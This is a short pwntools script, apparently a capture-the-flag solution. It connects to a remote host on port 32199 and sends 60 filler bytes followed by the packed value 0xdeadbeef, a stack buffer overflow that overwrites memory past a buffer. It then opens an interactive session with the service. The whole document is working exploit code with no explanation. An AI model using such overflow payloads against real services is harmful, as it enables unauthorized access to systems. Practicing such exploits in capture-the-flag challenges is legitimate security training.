from pwn import *

io = remote('a1ebcd4.678470.xyz', 32199)

payload = b'a'*60 + p64(0xdeadbeef)
io.sendline(payload)
io.interactive()